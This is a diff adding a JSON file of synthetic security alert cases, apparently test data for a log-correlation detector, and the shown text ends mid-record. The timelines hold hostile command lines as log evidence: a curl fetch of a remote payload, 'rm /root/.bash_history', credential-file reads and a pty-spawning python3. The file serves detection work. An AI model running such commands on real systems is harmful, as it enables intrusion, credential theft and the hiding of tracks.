@@ -1,0 +1,1812 @@
+[
+ {
+  "id": "CASE-001",
+  "pattern": "P1",
+  "score": 100,
+  "entity": "src=45.33.32.156 user=alice",
+  "hosts": [
+   "web-01"
+  ],
+  "first": "11-10 10:00",
+  "last": "11-10 10:15",
+  "n": 8,
+  "attack": [
+   "T1078",
+   "T1110",
+   "T1548.003"
+  ],
+  "summary": "실패 6회 후 로그인 성공, sudo 1회 · 연계: U-03",
+  "known": "",
+  "near": [],
+  "severity": "Critical",
+  "sev_basis": "실패 후 성공 · 외부 출발지",
+  "criterion": "EV-CORR-01",
+  "actor": "user:alice@web-01",
+  "timeline": [
+   [
+    "11-10 10:00",
+    "web-01",
+    "5716",
+    5,
+    "alice",
+    "45.33.32.156",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-10 10:01",
+    "web-01",
+    "5716",
+    5,
+    "alice",
+    "45.33.32.156",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-10 10:02",
+    "web-01",
+    "5716",
+    5,
+    "alice",
+    "45.33.32.156",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-10 10:03",
+    "web-01",
+    "5716",
+    5,
+    "alice",
+    "45.33.32.156",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-10 10:04",
+    "web-01",
+    "5716",
+    5,
+    "alice",
+    "45.33.32.156",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-10 10:05",
+    "web-01",
+    "5716",
+    5,
+    "alice",
+    "45.33.32.156",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-10 10:10",
+    "web-01",
+    "5715",
+    3,
+    "alice",
+    "45.33.32.156",
+    "",
+    "sshd: authentication success."
+   ],
+   [
+    "11-10 10:15",
+    "web-01",
+    "5402",
+    3,
+    "root",
+    "-",
+    "",
+    "Successful sudo to ROOT executed."
+   ]
+  ]
+ },
+ {
+  "id": "CASE-002",
+  "pattern": "P3",
+  "score": 90,
+  "entity": "host=app-01 user=carol src=10.7.1.5",
+  "hosts": [
+   "app-01"
+  ],
+  "first": "11-12 10:00",
+  "last": "11-12 11:30",
+  "n": 4,
+  "attack": [
+   "T1059",
+   "T1078",
+   "T1136.001",
+   "T1548.003"
+  ],
+  "summary": "로그인 → 호스트 권한·계정 변경 1건 → 2시간 내 침해 행위 1건 (직전 로그인 기준)",
+  "known": "",
+  "near": [],
+  "severity": "High",
+  "sev_basis": "침해 연쇄",
+  "criterion": "EV-CORR-03",
+  "actor": "user:carol@app-01",
+  "timeline": [
+   [
+    "11-12 10:00",
+    "app-01",
+    "5715",
+    3,
+    "carol",
+    "10.7.1.5",
+    "",
+    "sshd: authentication success."
+   ],
+   [
+    "11-12 10:30",
+    "app-01",
+    "5402",
+    3,
+    "root",
+    "-",
+    "",
+    "Successful sudo to ROOT executed."
+   ],
+   [
+    "11-12 11:00",
+    "app-01",
+    "200001",
+    10,
+    "-",
+    "-",
+    "useradd: new user: name=svc1, UID=1001",
+    "New user added to the system."
+   ],
+   [
+    "11-12 11:30",
+    "app-01",
+    "200002",
+    12,
+    "auid=-",
+    "-",
+    "/usr/bin/python3 python3 -c import pty last",
+    "Suspicious interpreter started."
+   ]
+  ]
+ },
+ {
+  "id": "CASE-003",
+  "pattern": "P4",
+  "score": 90,
+  "entity": "host=app-02 rule=200003",
+  "hosts": [
+   "app-02"
+  ],
+  "first": "11-13 10:00",
+  "last": "11-13 10:20",
+  "n": 4,
+  "attack": [
+   "T1070.003",
+   "T1552.001",
+   "T1562.001"
+  ],
+  "summary": "Audit daemon stopped by an interactive u 2건 후 1시간 내 민감정보 접근·흔적 삭제 2건 (흔적 삭제 1)",
+  "known": "",
+  "near": [
+   "CASE-004"
+  ],
+  "severity": "High",
+  "sev_basis": "방어 무력화",
+  "criterion": "EV-CORR-04",
+  "actor": "host:app-02",
+  "timeline": [
+   [
+    "11-13 10:00",
+    "app-02",
+    "200003",
+    12,
+    "auid=1001",
+    "-",
+    "/usr/bin/systemctl",
+    "Audit daemon stopped by an interactive user and left disabled."
+   ],
+   [
+    "11-13 10:01",
+    "app-02",
+    "200003",
+    12,
+    "auid=1001",
+    "-",
+    "/usr/bin/systemctl",
+    "Audit daemon stopped by an interactive user and left disabled."
+   ],
+   [
+    "11-13 10:10",
+    "app-02",
+    "200005",
+    12,
+    "auid=1001",
+    "-",
+    "/etc/shadow",
+    "Credential file read."
+   ],
+   [
+    "11-13 10:20",
+    "app-02",
+    "200004",
+    10,
+    "auid=1001",
+    "-",
+    "/usr/bin/rm rm /root/.bash_history",
+    "Shell history removed."
+   ]
+  ]
+ },
+ {
+  "id": "CASE-004",
+  "pattern": "P5",
+  "score": 85,
+  "entity": "host=app-03",
+  "hosts": [
+   "app-03"
+  ],
+  "first": "11-13 10:12",
+  "last": "11-13 10:40",
+  "n": 2,
+  "attack": [
+   "T1552.001",
+   "T1560.001"
+  ],
+  "summary": "민감정보 접근 1건 → 1시간 내 반출 도구 1건",
+  "known": "",
+  "near": [
+   "CASE-003"
+  ],
+  "severity": "High",
+  "sev_basis": "민감정보 반출",
+  "criterion": "EV-CORR-05",
+  "actor": "host:app-03",
+  "timeline": [
+   [
+    "11-13 10:12",
+    "app-03",
+    "200005",
+    12,
+    "auid=1003",
+    "-",
+    "/etc/kubernetes/admin.conf",
+    "Credential file read."
+   ],
+   [
+    "11-13 10:40",
+    "app-03",
+    "100815",
+    10,
+    "auid=1003",
+    "-",
+    "/usr/bin/tar tar czf /tmp/x.tgz",
+    "Archive created from a sensitive path."
+   ]
+  ]
+ },
+ {
+  "id": "CASE-005",
+  "pattern": "P2",
+  "score": 80,
+  "entity": "user=root src=10.7.0.5 host=db-02",
+  "hosts": [
+   "db-02"
+  ],
+  "first": "11-11 12:00",
+  "last": "11-11 12:00",
+  "n": 1,
+  "attack": [
+   "T1078.003"
+  ],
+  "summary": "로그인 성공: root 직접 · 연계: U-01,U-28",
+  "known": "",
+  "near": [],
+  "severity": "Medium",
+  "sev_basis": "root 직접 로그인",
+  "criterion": "EV-CORR-02",
+  "actor": "user:root@db-02",
+  "timeline": [
+   [
+    "11-11 12:00",
+    "db-02",
+    "100904",
+    3,
+    "root",
+    "10.7.0.5",
+    "",
+    "sshd: authentication success."
+   ]
+  ]
+ },
+ {
+  "id": "CASE-006",
+  "pattern": "P2",
+  "score": 70,
+  "entity": "user=bob src=10.9.9.9 host=db-01",
+  "hosts": [
+   "db-01"
+  ],
+  "first": "11-10 23:00",
+  "last": "11-10 23:20",
+  "n": 2,
+  "attack": [
+   "T1078",
+   "T1548.003"
+  ],
+  "summary": "로그인 성공: 최초 출발지, sudo 1회 · 정상 업무 일치 1건 제외",
+  "known": "",
+  "near": [],
+  "severity": "High",
+  "sev_basis": "최초 출발지 로그인 + 권한 사용 · 업무 외 시간",
+  "criterion": "EV-CORR-02",
+  "actor": "user:bob@db-01",
+  "timeline": [
+   [
+    "11-10 23:00",
+    "db-01",
+    "5715",
+    3,
+    "bob",
+    "10.9.9.9",
+    "",
+    "sshd: authentication success."
+   ],
+   [
+    "11-10 23:20",
+    "db-01",
+    "5402",
+    3,
+    "root",
+    "-",
+    "",
+    "Successful sudo to ROOT executed."
+   ]
+  ]
+ },
+ {
+  "id": "CASE-007",
+  "pattern": "P6",
+  "score": 70,
+  "entity": "user=dave",
+  "hosts": [
+   "web-01"
+  ],
+  "first": "11-14 10:00",
+  "last": "11-14 10:11",
+  "n": 60,
+  "attack": [
+   "T1110"
+  ],
+  "summary": "출발지 12곳에서 인증 실패 60회 (전체 출발지 12곳) · 연계: U-03",
+  "known": "",
+  "near": [],
+  "severity": "Medium",
+  "sev_basis": "분산 대입",
+  "criterion": "EV-CORR-06",
+  "actor": "user:dave@web-01",
+  "timeline": [
+   [
+    "11-14 10:00",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.1",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:00",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.1",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:00",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.1",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:00",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.1",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:00",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.1",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:01",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.2",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:01",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.2",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:01",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.2",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:01",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.2",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:01",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.2",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:02",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.3",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:02",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.3",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:02",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.3",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:02",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.3",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:02",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.3",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:03",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.4",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:03",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.4",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:03",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.4",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:03",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.4",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:03",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.4",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:04",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.5",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:04",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.5",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:04",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.5",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:04",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.5",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:04",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.5",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:07",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.8",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:07",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.8",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:07",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.8",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:07",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.8",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:07",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.8",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:08",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.9",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:08",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.9",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:08",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.9",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:08",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.9",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:08",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.9",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:09",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.10",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:09",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.10",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:09",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.10",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:09",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.10",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:09",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.10",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:10",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.11",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:10",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.11",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:10",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.11",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:10",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.11",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:10",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.11",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:11",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.12",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:11",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.12",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:11",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.12",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:11",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.12",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 10:11",
+    "web-01",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.12",
+    "",
+    "sshd: authentication failed."
+   ]
+  ]
+ },
+ {
+  "id": "CASE-008",
+  "pattern": "P2",
+  "score": 60,
+  "entity": "user=erin src=10.9.1.1 host=web-02",
+  "hosts": [
+   "web-02"
+  ],
+  "first": "11-10 14:05",
+  "last": "11-10 14:05",
+  "n": 1,
+  "attack": [
+   "T1078"
+  ],
+  "summary": "로그인 성공: 최초 출발지",
+  "known": "",
+  "near": [],
+  "severity": "Low",
+  "sev_basis": "최초 출발지 로그인",
+  "criterion": "EV-CORR-02",
+  "actor": "user:erin@web-02",
+  "timeline": [
+   [
+    "11-10 14:05",
+    "web-02",
+    "5715",
+    3,
+    "erin",
+    "10.9.1.1",
+    "",
+    "sshd: authentication success."
+   ]
+  ]
+ },
+ {
+  "id": "CASE-009",
+  "pattern": "P2",
+  "score": 60,
+  "entity": "user=frank src=10.9.2.2 host=db-03",
+  "hosts": [
+   "db-03"
+  ],
+  "first": "11-11 13:00",
+  "last": "11-11 13:00",
+  "n": 1,
+  "attack": [
+   "T1078"
+  ],
+  "summary": "로그인 성공: 허용 대역 외",
+  "known": "",
+  "near": [],
+  "severity": "Medium",
+  "sev_basis": "허용 대역 밖 로그인",
+  "criterion": "EV-CORR-02",
+  "actor": "user:frank@db-03",
+  "timeline": [
+   [
+    "11-11 13:00",
+    "db-03",
+    "100900",
+    3,
+    "frank",
+    "10.9.2.2",
+    "",
+    "sshd: authentication success."
+   ]
+  ]
+ },
+ {
+  "id": "CASE-010",
+  "pattern": "P6",
+  "score": 60,
+  "entity": "user=dave",
+  "hosts": [
+   "web-02"
+  ],
+  "first": "11-14 11:00",
+  "last": "11-14 11:02",
+  "n": 3,
+  "attack": [
+   "T1110"
+  ],
+  "summary": "출발지 3곳에서 인증 실패 3회 (전체 출발지 12곳)",
+  "known": "",
+  "near": [],
+  "severity": "Medium",
+  "sev_basis": "분산 대입",
+  "criterion": "EV-CORR-06",
+  "actor": "user:dave@web-02",
+  "timeline": [
+   [
+    "11-14 11:00",
+    "web-02",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.1",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 11:01",
+    "web-02",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.2",
+    "",
+    "sshd: authentication failed."
+   ],
+   [
+    "11-14 11:02",
+    "web-02",
+    "5716",
+    5,
+    "dave",
+    "10.20.0.3",
+    "",
+    "sshd: authentication failed."
+   ]
+  ]
+ },
+ {
+  "id": "CASE-011",
+  "pattern": "P8",
+  "score": 50,
+  "entity": "host=app-05 crash=sshd·sudo",
+  "hosts": [
+   "app-05"
+  ],
+  "first": "11-12 13:00",
+  "last": "11-12 13:00",
+  "n": 1,
+  "attack": [],
+  "summary": "sshd·sudo 비정상 종료(segfault) 1건",
+  "known": "",
+  "near": [],
+  "severity": "Low",
+  "sev_basis": "오류 급증",
+  "criterion": "EV-CORR-08",
+  "actor": "host:app-05",
+  "timeline": [
+   [
+    "11-12 13:00",
+    "app-05",
+    "200008",
+    5,
+    "-",
+    "-",
+    "kernel: sshd[1234]: segfault at 0 ip 00007f",
+    "Service reported an error 4711."
+   ]
+  ]
+ },
+ {
+  "id": "CASE-012",
+  "pattern": "P9",
+  "score": 50,
+  "entity": "rule=200003 actor=auid=1002",
+  "hosts": [
+   "app-08"
+  ],
+  "first": "11-13 18:00",
+  "last": "11-13 18:00",
+  "n": 1,
+  "attack": [
+   "T1562.001"
+  ],
+  "summary": "Audit daemon stopped by an interactive user and left disabled.",
+  "known": "",
+  "near": [],
+  "severity": "Medium",
+  "sev_basis": "rule level 12",
+  "criterion": "EV-EXEC-02",
+  "actor": "user:auid=1002@app-08",
+  "timeline": [
+   [
+    "11-13 18:00",
+    "app-08",
+    "200003",
+    12,
+    "auid=1002",
+    "-",
+    "/usr/bin/systemctl",
+    "Audit daemon stopped by an interactive user and left disabled."
+   ]
+  ]
+ },
+ {
+  "id": "CASE-013",
+  "pattern": "P9",
+  "score": 50,
+  "entity": "rule=200002,200009 actor=auid=1000",
+  "hosts": [
+   "app-06"
+  ],
+  "first": "11-15 10:00",
+  "last": "11-15 13:00",
+  "n": 3,
+  "attack": [
+   "T1059",
+   "T1105"
+  ],
+  "summary": "Download tool fetched a remote payload. / rule 2종 / 대상 3종 / 발생 구간 2회 (11-15 10:00, 11-15 13:00)",
+  "known": "",
+  "near": [],
+  "severity": "High",
+  "sev_basis": "rule level 14",
+  "criterion": "EV-EXEC-01",
+  "actor": "user:auid=1000@app-06",
+  "timeline": [
+   [
+    "11-15 10:00",
+    "app-06",
+    "200009",
+    14,
+    "auid=1000",
+    "-",
+    "/usr/bin/curl curl http://198.51.100.7/a",
+    "Download tool fetched a remote payload."
+   ],
+   [
+    "11-15 10:10",
+    "app-06",
+    "200009",
+    14,
+    "auid=1000",
+    "-",
+    "/usr/bin/curl curl http://198.51.100.7/b",
+    "Download tool fetched a remote payload."
+   ],
+   [
+    "11-15 13:00",
+    "app-06",
+    "200002",
+    12,
+    "auid=1000",
+    "-",
+    "/usr/bin/curl curl -s",
+    "Suspicious interpreter started."
+   ]
+  ]
+ },
+ {
+  "id": "CASE-014",
+  "pattern": "P7",
+  "score": 40,
+  "entity": "src=45.33.32.200",
+  "hosts": [
+   "web-01"
+  ],
+  "first": "11-14 14:00",
+  "last": "11-14 14:24",
+  "n": 25,
+  "attack": [
+   "T1595"
+  ],
+  "summary": "외부 탐색 25건",
+  "known": "",
+  "near": [
+   "CASE-020"
+  ],
+  "severity": "Low",
+  "sev_basis": "외부 탐색",
+  "criterion": "EV-CORR-07",
+  "actor": "host:web-01",
+  "timeline": [
+   [
+    "11-14 14:00",
+    "web-01",
+    "200006",
+    3,
+    "-",
+    "45.33.32.200",
+    "/admin/<N>",
+    "Web request to an unusual path."
+   ],
+   [
+    "11-14 14:01",
+    "web-01",
+    "200006",
+    3,
+    "-",
+    "45.33.32.200",
+    "/admin/<N>",
+    "Web request to an unusual path."
+   ],
+   [
+    "11-14 14:02",
+    "web-01",
+    "200006",
+    3,
+    "-",
+    "45.33.32.200",
+    "/admin/<N>",
+    "Web request to an unusual path."
+   ],
+   [
+    "11-14 14:03",
+    "web-01",
+    "200006",
+    3,
+    "-",
+    "45.33.32.200",
+    "/admin/<N>",
+    "Web request to an unusual path."
+   ],
+   [
+    "11-14 14:04",
+    "web-01",
+    "200006",
+    3,
+    "-",
+    "45.33.32.200",
+    "/admin/<N>",
+    "Web request to an unusual path."
+   ],
+   [
+    "11-14 14:05",
+    "web-01",
+    "200006",
+    3,
+    "-",
+    "45.33.32.200",
+    "/admin/<N>",
+    "Web request to an unusual path."
+   ],
+   [
+    "11-14 14:06",
+    "web-01",
+    "200006",
+    3,
+    "-",
+    "45.33.32.200",
+    "/admin/<N>",
+    "Web request to an unusual path."
+   ],
+   [
+    "11-14 14:07",
+    "web-01",
+    "200006",
+    3,
+    "-",
+    "45.33.32.200",
+    "/admin/<N>",
+    "Web request to an unusual path."
+   ],
+   [
+    "11-14 14:08",
+    "web-01",
+    "200006",
+    3,
+    "-",
+    "45.33.32.200",
+    "/admin/<N>",
+    "Web request to an unusual path."
+   ],
+   [
+    "11-14 14:09",
+    "web-01",
+    "200006",
+    3,
+    "-",
+    "45.33.32.200",
+    "/admin/<N>",
+    "Web request to an unusual path."
+   ],
+   [
+    "11-14 14:10",
+    "web-01",
+    "200006",
+    3,
+    "-",
+    "45.33.32.200",
+    "/admin/<N>",
+    "Web request to an unusual path."
+   ],
+   [
+    "11-14 14:11",
+    "web-01",
+    "200006",
+    3,
+    "-",
+    "45.33.32.200",
+    "/admin/<N>",
+    "Web request to an unusual path."
+   ],
+   [
+    "11-14 14:12",
+    "web-01",
+    "200006",
+    3,
+    "-",
+    "45.33.32.200",
+    "/admin/<N>",
+    "Web request to an unusual path."
+   ],
+   [
+    "11-14 14:13",
+    "web-01",
+    "200006",
+    3,
+    "-",
+    "45.33.32.200",
+    "/admin/<N>",
+    "Web request to an unusual path."
+   ],
+   [
+    "11-14 14:14",
+    "web-01",
+    "200006",
+    3,
+    "-",
+    "45.33.32.200",
+    "/admin/<N>",
+    "Web request to an unusual path."
+   ],
+   [
+    "11-14 14:15",
+    "web-01",
+    "200006",
+    3,
+    "-",
+    "45.33.32.200",
+    "/admin/<N>",
+    "Web request to an unusual path."
+   ],
+   [
+    "11-14 14:16",
+    "web-01",
+    "200006",
+    3,
+    "-",
+    "45.33.32.200",
+    "/admin/<N>",
+    "Web request to an unusual path."
+   ],
+   [
+    "11-14 14:17",
+    "web-01",
+    "200006",
+    3,
+    "-",
+    "45.33.32.200",
+    "/admin/<N>",
+    "Web request to an unusual path."
+   ],
+   [
+    "11-14 14:18",
+    "web-01",
+    "200006",
+    3,
+    "-",
+    "45.33.32.200",
+    "/admin/<N>",
+    "Web request to an unusual path."
+   ],
+   [
+    "11-14 14:19",
+    "web-01",
+    "200006",
+    3,
+    "-",
+    "45.33.32.200",
+    "/admin/<N>",
+    "Web request to an unusual path."
+   ],
+   [
+    "11-14 14:20",
+    "web-01",
+    "200006",
+    3,
+    "-",
+    "45.33.32.200",
+    "/admin/<N>",
+    "Web request to an unusual path."
+   ],
+   [
+    "11-14 14:21",
+    "web-01",
+    "200006",
+    3,
+    "-",
+    "45.33.32.200",
+    "/admin/<N>",
+    "Web request to an unusual path."
+   ],
+   [
+    "11-14 14:22",
+    "web-01",
+    "200006",
+    3,
+    "-",
+    "45.33.32.200",
+    "/admin/<N>",
+    "Web request to an unusual path."
+   ],
+   [
+    "11-14 14:23",
+    "web-01",
+    "200006",
+    3,
+    "-",
+    "45.33.32.200",
+    "/admin/<N>",
+    "Web request to an unusual path."
+   ],
+   [
+    "11-14 14:24",
+    "web-01",
+    "200006",
+    3,
+    "-",
+    "45.33.32.200",
+    "/admin/<N>",
+    "Web request to an unusual path."
+   ]
+  ]
+ },
+ {
+  "id": "CASE-015",
+  "pattern": "P9",
+  "score": 35,
+  "entity": "rule=200001 actor=-",
+  "hosts": [
+   "app-07"
+  ],
+  "first": "11-12 18:00",
+  "last": "11-12 18:00",
+  "n": 1,
+  "attack": [
+   "T1136.001"
+  ],
+  "summary": "New user added to the system.",
+  "known": "",
+  "near": [],
+  "severity": "Low",
+  "sev_basis": "rule level 10",
+  "criterion": "EV-PRIV-01",
+  "actor": "host:app-07",
+  "timeline": [
+   [
+    "11-12 18:00",
+    "app-07",
+    "200001",
+    10,
+    "-",
+    "-",
+    "useradd: new user: name=svc2",
+    "New user added to the system."
+   ]
+  ]
+ },
+ {
+  "id": "CASE-016",
+  "pattern": "P9",
+  "score": 35,
+  "entity": "rule=200010 actor=system:serviceaccount:kube-system:deployer",
+  "hosts": [
+   "k8s-cp-01"
+  ],
+  "first": "11-15 17:00",
+  "last": "11-15 17:00",
+  "n": 1,
+  "attack": [
+   "T1098",
+   "T1136"
+  ],
+  "summary": "Cluster role binding created.",
+  "known": "",
+  "near": [
+   "CASE-017",
+   "CASE-018"
+  ],
+  "severity": "Low",
+  "sev_basis": "rule level 10",
+  "criterion": "EV-PRIV-01",
+  "actor": "sa:kube-system/deployer",
+  "timeline": [
+   [
+    "11-15 17:00",
+    "k8s-cp-01",
+    "200010",
+    10,
+    "system:serviceaccount:kube-system:deployer",
+    "10.7.2.2",
+    "create -/cluster-admin-x",
+    "Cluster role binding created."
+   ]
+  ]
+ },
+ {
+  "id": "CASE-017",
+  "pattern": "P9",
+  "score": 35,
+  "entity": "rule=200010 actor=admin@corp.example",
+  "hosts": [
+   "k8s-cp-01"
+  ],
+  "first": "11-15 17:01",
+  "last": "11-15 17:01",
+  "n": 1,
+  "attack": [
+   "T1098",
+   "T1136"
+  ],
+  "summary": "Cluster role binding created.",
+  "known": "",
+  "near": [
+   "CASE-016",
+   "CASE-018"
+  ],
+  "severity": "Low",
+  "sev_basis": "rule level 10",
+  "criterion": "EV-PRIV-01",
+  "actor": "user:admin@corp.example",
+  "timeline": [
+   [
+    "11-15 17:01",
+    "k8s-cp-01",
+    "200010",
+    10,
+    "admin@corp.example",
+    "10.7.2.3",
+    "create prod/edit-x",
+    "Cluster role binding created."
+   ]
+  ]
+ },
+ {
+  "id": "CASE-018",
+  "pattern": "P9",
+  "score": 35,
+  "entity": "rule=200010 actor=kubernetes-admin",
+  "hosts": [
+   "k8s-cp-01"
+  ],
+  "first": "11-15 17:02",
+  "last": "11-15 17:02",
+  "n": 1,
+  "attack": [
+   "T1098",
+   "T1136"
+  ],
+  "summary": "Cluster role binding created.",
+  "known": "",
+  "near": [
+   "CASE-016",
+   "CASE-017"
+  ],
+  "severity": "Low",
+  "sev_basis": "rule level 10",
+  "criterion": "EV-PRIV-01",
+  "actor": "cert:kubernetes-admin",
+  "timeline": [
+   [
+    "11-15 17:02",
+    "k8s-cp-01",
+    "200010",
+    10,
+    "kubernetes-admin",
+    "10.7.2.4",
+    "patch -/clusterroles",
+    "Cluster role binding created."
+   ]
+  ]
+ },
+ {
+  "id": "CASE-019",
+  "pattern": "P8",
+  "score": 30,
+  "entity": "host=app-04 rule=200008",
+  "hosts": [
+   "app-04"
+  ],
+  "first": "11-12 12:00",
+  "last": "11-12 12:14",
+  "n": 15,
+  "attack": [],
+  "summary": "11-12 Service reported an error 4711. 하루 15건 (이전 중앙값 2)",
+  "known": "",
+  "near": [],
+  "severity": "Low",
+  "sev_basis": "오류 급증",
+  "criterion": "EV-CORR-08",
+  "actor": "host:app-04",
+  "timeline": [
+   [
+    "11-12 12:00",
+    "app-04",
+    "200008",
+    5,
+    "-",
+    "-",
+    "svc[0]: error 4711",
+    "Service reported an error 4711."
+   ],
+   [
+    "11-12 12:01",
+    "app-04",
+    "200008",
+    5,
+    "-",
+    "-",
+    "svc[1]: error 4711",
+    "Service reported an error 4711."
+   ],
+   [
+    "11-12 12:02",
+    "app-04",
+    "200008",
+    5,
+    "-",
+    "-",
+    "svc[2]: error 4711",
+    "Service reported an error 4711."
+   ],
+   [
+    "11-12 12:03",
+    "app-04",
+    "200008",
+    5,
+    "-",
+    "-",
+    "svc[3]: error 4711",
+    "Service reported an error 4711."
+   ],
+   [
+    "11-12 12:04",
+    "app-04",
+    "200008",
+    5,
+    "-",
+    "-",
